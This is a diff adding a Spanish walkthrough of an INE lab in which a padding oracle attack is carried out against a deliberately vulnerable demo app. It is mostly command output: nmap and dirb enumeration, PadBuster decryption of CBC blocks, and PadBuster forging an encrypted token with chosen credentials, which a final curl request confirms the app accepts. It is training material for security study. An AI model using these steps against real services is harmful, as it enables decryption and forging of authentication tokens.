@@ -69,7 +69,400 @@
 
 <h2 id="teoría">Teoría</h2>
 
+<p>El ejercicio se basa en entender como funciona la operación criptográfica que utiliza el servidor e intentar inferir la clave</p>
+
 <h2 id="laboratorios">Laboratorios</h2>
+
+<p>Enunciado:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In this lab, you will learn to perform a padding oracle attack on a vulnerable application to steal the signing key and also create a valid attacker-controlled encrypted message.
+
+
+Lab Environment
+In this lab environment, the user will get access to a Kali GUI instance. A Python application vulnerable to padding oracle attack can be accessed using the tools installed on Kali at http://demo.ine.local.
+Objective: Exploit the vulnerable application to perform a padding oracle attack and steal the signing key. Also, create a valid attacker-controlled encrypted message.
+
+
+Acknowledgements
+The setup code is based on the following Github repository:
+https://github.com/GDSSecurity/PaddingOracleDemos
+
+
+Tools
+The best tools for this lab are:
+Nmap
+Padbuster
+A web browser
+
+Please go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course will dramatically reduce the benefits of a hands-on lab!
+</code></pre></div></div>
+
+<h3 id="enumeración-del-servicio">Enumeración del servicio</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# nmap demo.ine.local
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-12-31 02:02 IST
+Nmap scan report <span class="k">for </span>demo.ine.local <span class="o">(</span>192.135.68.3<span class="o">)</span>
+Host is up <span class="o">(</span>0.000024s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 999 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 02:42:C0:87:44:03 <span class="o">(</span>Unknown<span class="o">)</span>
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.18 seconds
+</code></pre></div></div>
+
+<p>Enumeración de urls en el servidor:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# dirb http://demo.ine.local
+
+<span class="nt">-----------------</span>
+DIRB v2.22    
+By The Dark Raver
+<span class="nt">-----------------</span>
+
+START_TIME: Tue Dec 31 02:05:39 2024
+URL_BASE: http://demo.ine.local/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+<span class="nt">-----------------</span>
+
+GENERATED WORDS: 4612                                                          
+
+<span class="nt">----</span> Scanning URL: http://demo.ine.local/ <span class="nt">----</span>
++ http://demo.ine.local/check <span class="o">(</span>CODE:200|SIZE:27<span class="o">)</span>                                                                                                                                            
++ http://demo.ine.local/console <span class="o">(</span>CODE:200|SIZE:1985<span class="o">)</span>                                                                                                                                       
++ http://demo.ine.local/encrypt <span class="o">(</span>CODE:200|SIZE:41<span class="o">)</span>                                                                                                                                         
+                                                                                                                                                                                           
+<span class="nt">-----------------</span>
+END_TIME: Tue Dec 31 02:05:46 2024
+DOWNLOADED: 4612 - FOUND: 3
+</code></pre></div></div>
+
+<p><img src="./assets/images/padding_enum.png" alt="Enum Padding" /></p>
+
+<h3 id="cifrado-por-url">Cifrado por url:</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://demo.ine.local/encrypt?plain=ApplicationUsername%3duser%26Password%3dsesame
+
+</code></pre></div></div>
+<p>resouesta:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crypted: 6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
+</code></pre></div></div>
+
+<h3 id="descifrado-por-url">descifrado por url</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://demo.ine.local/echo?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
+</code></pre></div></div>
+<p>respuesta:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decrypted: ApplicationUsername=user&amp;Password=sesame
+</code></pre></div></div>
+
+<h3 id="revisión-de-errores">revisión de errores</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>These errors may suggest that:
+• The string consists of hexadecimal characters (0-0xff)
+• The string has to be aligned to two characters
+• The string is being decrypted somehow
+</code></pre></div></div>
+
+<h3 id="utilizando-padbuster">utilizando padbuster</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# padbuster <span class="s2">"http://demo.ine.local/echo?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80"</span> <span class="s2">"6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80"</span> 16 <span class="nt">-encoding</span> 1
+
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+
+INFO: The original request returned the following
+<span class="o">[</span>+] Status: 200
+<span class="o">[</span>+] Location: N/A
+<span class="o">[</span>+] Content Length: 51
+
+INFO: Starting PadBuster Decrypt Mode
+<span class="k">***</span> Starting Block 1 of 2 <span class="k">***</span>
+
+INFO: No error string was provided...starting response analysis
+
+<span class="k">***</span> Response Analysis Complete <span class="k">***</span>
+
+The following response signatures were returned:
+
+<span class="nt">-------------------------------------------------------</span>
+ID#     Freq    Status  Length  Location
+<span class="nt">-------------------------------------------------------</span>
+1       1       200     42      N/A
+2 <span class="k">**</span>    255     200     16      N/A
+<span class="nt">-------------------------------------------------------</span>
+
+Enter an ID that matches the error condition
+NOTE: The ID# marked with <span class="k">**</span> is recommended : 2
+
+Continuing <span class="nb">test </span>with selection 2
+
+<span class="o">[</span>+] Success: <span class="o">(</span>191/256<span class="o">)</span> <span class="o">[</span>Byte 16]
+<span class="o">[</span>+] Success: <span class="o">(</span>29/256<span class="o">)</span> <span class="o">[</span>Byte 15]
+<span class="o">[</span>+] Success: <span class="o">(</span>167/256<span class="o">)</span> <span class="o">[</span>Byte 14]
+<span class="o">[</span>+] Success: <span class="o">(</span>58/256<span class="o">)</span> <span class="o">[</span>Byte 13]
+<span class="o">[</span>+] Success: <span class="o">(</span>192/256<span class="o">)</span> <span class="o">[</span>Byte 12]
+<span class="o">[</span>+] Success: <span class="o">(</span>54/256<span class="o">)</span> <span class="o">[</span>Byte 11]
+<span class="o">[</span>+] Success: <span class="o">(</span>138/256<span class="o">)</span> <span class="o">[</span>Byte 10]
+<span class="o">[</span>+] Success: <span class="o">(</span>50/256<span class="o">)</span> <span class="o">[</span>Byte 9]
+<span class="o">[</span>+] Success: <span class="o">(</span>184/256<span class="o">)</span> <span class="o">[</span>Byte 8]
+<span class="o">[</span>+] Success: <span class="o">(</span>115/256<span class="o">)</span> <span class="o">[</span>Byte 7]
+<span class="o">[</span>+] Success: <span class="o">(</span>25/256<span class="o">)</span> <span class="o">[</span>Byte 6]
+<span class="o">[</span>+] Success: <span class="o">(</span>180/256<span class="o">)</span> <span class="o">[</span>Byte 5]
+<span class="o">[</span>+] Success: <span class="o">(</span>64/256<span class="o">)</span> <span class="o">[</span>Byte 4]
+<span class="o">[</span>+] Success: <span class="o">(</span>219/256<span class="o">)</span> <span class="o">[</span>Byte 3]
+<span class="o">[</span>+] Success: <span class="o">(</span>252/256<span class="o">)</span> <span class="o">[</span>Byte 2]
+<span class="o">[</span>+] Success: <span class="o">(</span>230/256<span class="o">)</span> <span class="o">[</span>Byte 1]
+
+Block 1 Results:
+<span class="o">[</span>+] Cipher Text <span class="o">(</span>HEX<span class="o">)</span>: b8f1335522753d45174435c16b52dc2e
+<span class="o">[</span>+] Intermediate Bytes <span class="o">(</span>HEX<span class="o">)</span>: 0a0b2bcd40ec8741c671cc45c25ae140
+<span class="o">[</span>+] Plain Text: <span class="nv">ame</span><span class="o">=</span>user&amp;Passwor
+
+Use of uninitialized value <span class="nv">$plainTextBytes</span> <span class="k">in </span>concatenation <span class="o">(</span>.<span class="o">)</span> or string at /usr/bin/padbuster line 361, &lt;STDIN&gt; line 1.
+<span class="k">***</span> Starting Block 2 of 2 <span class="k">***</span>
+
+<span class="o">[</span>+] Success: <span class="o">(</span>217/256<span class="o">)</span> <span class="o">[</span>Byte 16]
+<span class="o">[</span>+] Success: <span class="o">(</span>42/256<span class="o">)</span> <span class="o">[</span>Byte 15]
+<span class="o">[</span>+] Success: <span class="o">(</span>167/256<span class="o">)</span> <span class="o">[</span>Byte 14]
+<span class="o">[</span>+] Success: <span class="o">(</span>153/256<span class="o">)</span> <span class="o">[</span>Byte 13]
+<span class="o">[</span>+] Success: <span class="o">(</span>52/256<span class="o">)</span> <span class="o">[</span>Byte 12]
+<span class="o">[</span>+] Success: <span class="o">(</span>197/256<span class="o">)</span> <span class="o">[</span>Byte 11]
+<span class="o">[</span>+] Success: <span class="o">(</span>181/256<span class="o">)</span> <span class="o">[</span>Byte 10]
+<span class="o">[</span>+] Success: <span class="o">(</span>233/256<span class="o">)</span> <span class="o">[</span>Byte 9]
+<span class="o">[</span>+] Success: <span class="o">(</span>215/256<span class="o">)</span> <span class="o">[</span>Byte 8]
+<span class="o">[</span>+] Success: <span class="o">(</span>166/256<span class="o">)</span> <span class="o">[</span>Byte 7]
+<span class="o">[</span>+] Success: <span class="o">(</span>225/256<span class="o">)</span> <span class="o">[</span>Byte 6]
+<span class="o">[</span>+] Success: <span class="o">(</span>163/256<span class="o">)</span> <span class="o">[</span>Byte 5]
+<span class="o">[</span>+] Success: <span class="o">(</span>195/256<span class="o">)</span> <span class="o">[</span>Byte 4]
+<span class="o">[</span>+] Success: <span class="o">(</span>178/256<span class="o">)</span> <span class="o">[</span>Byte 3]
+<span class="o">[</span>+] Success: <span class="o">(</span>61/256<span class="o">)</span> <span class="o">[</span>Byte 2]
+<span class="o">[</span>+] Success: <span class="o">(</span>52/256<span class="o">)</span> <span class="o">[</span>Byte 1]
+
+Block 2 Results:
+<span class="o">[</span>+] Cipher Text <span class="o">(</span>HEX<span class="o">)</span>: 5bbd4363b9d91d4c9100beae6ce34e80
+<span class="o">[</span>+] Intermediate Bytes <span class="o">(</span>HEX<span class="o">)</span>: dccc4030511450201f4c3dc9635ad426
+<span class="o">[</span>+] Plain Text: <span class="nv">d</span><span class="o">=</span>sesame
+
+<span class="nt">-------------------------------------------------------</span>
+<span class="k">**</span> Finished <span class="k">***</span>
+
+<span class="o">[</span>+] Decrypted value <span class="o">(</span>ASCII<span class="o">)</span>: <span class="nv">ame</span><span class="o">=</span>user&amp;Password<span class="o">=</span>sesame
+
+<span class="o">[</span>+] Decrypted value <span class="o">(</span>HEX<span class="o">)</span>: 616D653D757365722650617373776F72643D736573616D650808080808080808
+
+<span class="o">[</span>+] Decrypted value <span class="o">(</span>Base64<span class="o">)</span>: <span class="nv">YW1lPXVzZXImUGFzc3dvcmQ9c2VzYW1lCAgICAgICAg</span><span class="o">=</span>
+
+<span class="nt">-------------------------------------------------------</span>
+
+</code></pre></div></div>
+
+<p>Revisando los bloques descifrados, se detecta que:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Block 1 Results:
+[+] Cipher Text (HEX): b8f1335522753d45174435c16b52dc2e
+[+] Intermediate Bytes (HEX): 0a0b2bcd40ec8741c671cc45c25ae140
+[+] Plain Text: ame=user&amp;Passwor
+
+Block 2 Results:
+[+] Cipher Text (HEX): 5bbd4363b9d91d4c9100beae6ce34e80
+[+] Intermediate Bytes (HEX): dccc4030511450201f4c3dc9635ad426
+[+] Plain Text: d=sesame
+
+</code></pre></div></div>
+
+<p><img src="./assets/images/xor_cbc.png" alt="cbc xor" /></p>
+
+<p>se han podido descifrar dos bloques de tres, esto es debido a que no conocemos el vector de inicialización IV</p>
+
+<p>si revisamos la repuesta completa:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decrypted: ApplicationUsername=user&amp;Password=sesame parsed: {'Password': ['sesame'], 'ApplicationUsername': ['user']}
+</code></pre></div></div>
+<h3 id="análisis-del-cifrado">Análisis del cifrado</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ApplicationUsername=user&amp;Password=sesame
+</code></pre></div></div>
+<p>Bloque 1: (No descifrado)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6b664ef0359fe233e021ad36b12d8e32
+ApplicationUsern
+</code></pre></div></div>
+
+<p>Bloque 2</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b8f1335522753d45174435c16b52dc2e
+ame=user&amp;Passwor
+</code></pre></div></div>
+
+<p>Bloque 3:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5bbd4363b9d91d4c9100beae6ce34e80
+d=sesame
+
+</code></pre></div></div>
+
+<p>Trabajando sobre el bloque 1:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# padbuster "http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32" "6b664ef0359fe233e021ad36b12d8e32" 16 -encoding 1 -error "ApplicationUsername missing" -prefix "6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e" -noiv
+
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+
+INFO: The original request returned the following
+[+] Status: 200
+[+] Location: N/A
+[+] Content Length: 27
+
+INFO: Starting PadBuster Decrypt Mode
+*** Starting Block 1 of 1 ***
+
+[+] Success: (244/256) [Byte 16]
+[+] Success: (188/256) [Byte 15]
+[+] Success: (256/256) [Byte 14]
+[+] Success: (236/256) [Byte 13]
+[+] Success: (158/256) [Byte 12]
+[+] Success: (168/256) [Byte 11]
+[+] Success: (165/256) [Byte 10]
+[+] Success: (168/256) [Byte 9]
+[+] Success: (180/256) [Byte 8]
+[+] Success: (246/256) [Byte 7]
+[+] Success: (242/256) [Byte 6]
+[+] Success: (173/256) [Byte 5]
+[+] Success: (252/256) [Byte 4]
+[+] Success: (185/256) [Byte 3]
+[+] Success: (229/256) [Byte 2]
+[+] Success: (206/256) [Byte 1]
+
+Block 1 Results:
+[+] Cipher Text (HEX): 6b664ef0359fe233e021ad36b12d8e32
+[+] Intermediate Bytes (HEX): 221449095f050045505c5e671003460d
+[+] Plain Text: "I      _EP\^gF
+
+Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361.
+-------------------------------------------------------
+** Finished ***
+
+[+] Decrypted value (ASCII): "I _EP\^gF
+
+[+] Decrypted value (HEX): 221449095F050045505C5E671003460D
+
+[+] Decrypted value (Base64): IhRJCV8FAEVQXF5nEANGDQ==
+
+-------------------------------------------------------
+
+</code></pre></div></div>
+
+<p><img src="./assets/images/padding_xor.png" alt="cbc xor" /></p>
+
+<h3 id="creando-con-padbuster-un-nuevo-token">creando con padbuster un nuevo token</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# padbuster <span class="s2">"http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32"</span> <span class="s2">"6b664ef0359fe233e021ad36b12d8e32"</span> 16 <span class="nt">-encoding</span> 1 <span class="nt">-error</span> <span class="s2">"ApplicationUsername missing"</span> <span class="nt">-prefix</span> <span class="s2">"6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e"</span> <span class="nt">-plaintext</span> <span class="s2">"=xyz&amp;ApplicationUsername=f0ns1&amp;Password=access"</span>
+
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+
+INFO: The original request returned the following
+<span class="o">[</span>+] Status: 200
+<span class="o">[</span>+] Location: N/A
+<span class="o">[</span>+] Content Length: 27
+
+INFO: Starting PadBuster Encrypt Mode
+<span class="o">[</span>+] Number of Blocks: 3
+
+<span class="o">[</span>+] Success: <span class="o">(</span>129/256<span class="o">)</span> <span class="o">[</span>Byte 16]
+<span class="o">[</span>+] Success: <span class="o">(</span>238/256<span class="o">)</span> <span class="o">[</span>Byte 15]
+<span class="o">[</span>+] Success: <span class="o">(</span>58/256<span class="o">)</span> <span class="o">[</span>Byte 14]
+<span class="o">[</span>+] Success: <span class="o">(</span>228/256<span class="o">)</span> <span class="o">[</span>Byte 13]
+<span class="o">[</span>+] Success: <span class="o">(</span>246/256<span class="o">)</span> <span class="o">[</span>Byte 12]
+<span class="o">[</span>+] Success: <span class="o">(</span>214/256<span class="o">)</span> <span class="o">[</span>Byte 11]
+<span class="o">[</span>+] Success: <span class="o">(</span>50/256<span class="o">)</span> <span class="o">[</span>Byte 10]
+<span class="o">[</span>+] Success: <span class="o">(</span>129/256<span class="o">)</span> <span class="o">[</span>Byte 9]
+<span class="o">[</span>+] Success: <span class="o">(</span>72/256<span class="o">)</span> <span class="o">[</span>Byte 8]
+<span class="o">[</span>+] Success: <span class="o">(</span>253/256<span class="o">)</span> <span class="o">[</span>Byte 7]
+<span class="o">[</span>+] Success: <span class="o">(</span>25/256<span class="o">)</span> <span class="o">[</span>Byte 6]
+<span class="o">[</span>+] Success: <span class="o">(</span>49/256<span class="o">)</span> <span class="o">[</span>Byte 5]
+<span class="o">[</span>+] Success: <span class="o">(</span>9/256<span class="o">)</span> <span class="o">[</span>Byte 4]
+<span class="o">[</span>+] Success: <span class="o">(</span>249/256<span class="o">)</span> <span class="o">[</span>Byte 3]
+<span class="o">[</span>+] Success: <span class="o">(</span>131/256<span class="o">)</span> <span class="o">[</span>Byte 2]
+<span class="o">[</span>+] Success: <span class="o">(</span>39/256<span class="o">)</span> <span class="o">[</span>Byte 1]
+
+Block 3 Results:
+<span class="o">[</span>+] New Cipher Text <span class="o">(</span>HEX<span class="o">)</span>: a8017a8dac9e6d8c16aa4f6a6bb6127c
+<span class="o">[</span>+] Intermediate Bytes <span class="o">(</span>HEX<span class="o">)</span>: c97209fac3ec09b177c92c0f18c5107e
+
+<span class="o">[</span>+] Success: <span class="o">(</span>16/256<span class="o">)</span> <span class="o">[</span>Byte 16]
+<span class="o">[</span>+] Success: <span class="o">(</span>204/256<span class="o">)</span> <span class="o">[</span>Byte 15]
+<span class="o">[</span>+] Success: <span class="o">(</span>30/256<span class="o">)</span> <span class="o">[</span>Byte 14]
+<span class="o">[</span>+] Success: <span class="o">(</span>94/256<span class="o">)</span> <span class="o">[</span>Byte 13]
+<span class="o">[</span>+] Success: <span class="o">(</span>195/256<span class="o">)</span> <span class="o">[</span>Byte 12]
+<span class="o">[</span>+] Success: <span class="o">(</span>171/256<span class="o">)</span> <span class="o">[</span>Byte 11]
+<span class="o">[</span>+] Success: <span class="o">(</span>129/256<span class="o">)</span> <span class="o">[</span>Byte 10]
+<span class="o">[</span>+] Success: <span class="o">(</span>108/256<span class="o">)</span> <span class="o">[</span>Byte 9]
+<span class="o">[</span>+] Success: <span class="o">(</span>88/256<span class="o">)</span> <span class="o">[</span>Byte 8]
+<span class="o">[</span>+] Success: <span class="o">(</span>46/256<span class="o">)</span> <span class="o">[</span>Byte 7]
+<span class="o">[</span>+] Success: <span class="o">(</span>249/256<span class="o">)</span> <span class="o">[</span>Byte 6]
+<span class="o">[</span>+] Success: <span class="o">(</span>2/256<span class="o">)</span> <span class="o">[</span>Byte 5]
+<span class="o">[</span>+] Success: <span class="o">(</span>92/256<span class="o">)</span> <span class="o">[</span>Byte 4]
+<span class="o">[</span>+] Success: <span class="o">(</span>227/256<span class="o">)</span> <span class="o">[</span>Byte 3]
+<span class="o">[</span>+] Success: <span class="o">(</span>9/256<span class="o">)</span> <span class="o">[</span>Byte 2]
+<span class="o">[</span>+] Success: <span class="o">(</span>255/256<span class="o">)</span> <span class="o">[</span>Byte 1]
+
+Block 2 Results:
+<span class="o">[</span>+] New Cipher Text <span class="o">(</span>HEX<span class="o">)</span>: 448b76db9c6db5c4a11e6356d5d010a1
+<span class="o">[</span>+] Intermediate Bytes <span class="o">(</span>HEX<span class="o">)</span>: 11f813a9f20cd8a19c785338a6e136f1
+
+<span class="o">[</span>+] Success: <span class="o">(</span>246/256<span class="o">)</span> <span class="o">[</span>Byte 16]
+<span class="o">[</span>+] Success: <span class="o">(</span>121/256<span class="o">)</span> <span class="o">[</span>Byte 15]
+<span class="o">[</span>+] Success: <span class="o">(</span>25/256<span class="o">)</span> <span class="o">[</span>Byte 14]
+<span class="o">[</span>+] Success: <span class="o">(</span>126/256<span class="o">)</span> <span class="o">[</span>Byte 13]
+<span class="o">[</span>+] Success: <span class="o">(</span>171/256<span class="o">)</span> <span class="o">[</span>Byte 12]
+<span class="o">[</span>+] Success: <span class="o">(</span>82/256<span class="o">)</span> <span class="o">[</span>Byte 11]
+<span class="o">[</span>+] Success: <span class="o">(</span>205/256<span class="o">)</span> <span class="o">[</span>Byte 10]
+<span class="o">[</span>+] Success: <span class="o">(</span>94/256<span class="o">)</span> <span class="o">[</span>Byte 9]
+<span class="o">[</span>+] Success: <span class="o">(</span>158/256<span class="o">)</span> <span class="o">[</span>Byte 8]
+<span class="o">[</span>+] Success: <span class="o">(</span>60/256<span class="o">)</span> <span class="o">[</span>Byte 7]
+<span class="o">[</span>+] Success: <span class="o">(</span>195/256<span class="o">)</span> <span class="o">[</span>Byte 6]
+<span class="o">[</span>+] Success: <span class="o">(</span>252/256<span class="o">)</span> <span class="o">[</span>Byte 5]
+<span class="o">[</span>+] Success: <span class="o">(</span>125/256<span class="o">)</span> <span class="o">[</span>Byte 4]
+<span class="o">[</span>+] Success: <span class="o">(</span>60/256<span class="o">)</span> <span class="o">[</span>Byte 3]
+<span class="o">[</span>+] Success: <span class="o">(</span>67/256<span class="o">)</span> <span class="o">[</span>Byte 2]
+<span class="o">[</span>+] Success: <span class="o">(</span>79/256<span class="o">)</span> <span class="o">[</span>Byte 1]
+
+Block 1 Results:
+<span class="o">[</span>+] New Cipher Text <span class="o">(</span>HEX<span class="o">)</span>: 9ccab3f42e77be1bc65dcb31f28dea65
+<span class="o">[</span>+] Intermediate Bytes <span class="o">(</span>HEX<span class="o">)</span>: a1b2ca8e0836ce6baa34a85086e4850b
+
+<span class="nt">-------------------------------------------------------</span>
+<span class="k">**</span> Finished <span class="k">***</span>
+
+<span class="o">[</span>+] Encrypted value is: 9ccab3f42e77be1bc65dcb31f28dea65448b76db9c6db5c4a11e6356d5d010a1a8017a8dac9e6d8c16aa4f6a6bb6127c00000000000000000000000000000000
+<span class="nt">-------------------------------------------------------</span>
+
+</code></pre></div></div>
+
+<p>validación:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# curl <span class="nt">-X</span> GET <span class="s2">"http://demo.ine.local/check?cipher=9ccab3f42e77be1bc65dcb31f28dea65448b76db9c6db5c4a11e6356d5d010a1a8017a8dac9e6d8c16aa4f6a6bb6127c00000000000000000000000000000000"</span> <span class="nt">--output</span> test.html
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   202  100   202    0     0  69487      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--   98k
+root@INE:~# <span class="nb">cat </span>test.html <span class="p">;</span> <span class="nb">echo
+</span>decrypted: zU�H���W�v<span class="o">=</span>xyz&amp;ApplicationUsername<span class="o">=</span>f0ns1&amp;Password<span class="o">=</span>access
+parsed: <span class="o">{</span><span class="s1">'\x00\xd6\x93zU\xa4H\xff\xb4\x81W\xd2\x1d\x00v\x06'</span>: <span class="o">[</span><span class="s1">'xyz'</span><span class="o">]</span>, <span class="s1">'Password'</span>: <span class="o">[</span><span class="s1">'access'</span><span class="o">]</span>, <span class="s1">'ApplicationUsername'</span>: <span class="o">[</span><span class="s1">'f0ns1'</span><span class="o">]}</span>
+</code></pre></div></div>
+
+<p><img src="./assets/images/cipher_attack.png" alt="cbc xor" /></p>
 
 <p><a href="./">back</a></p>
 
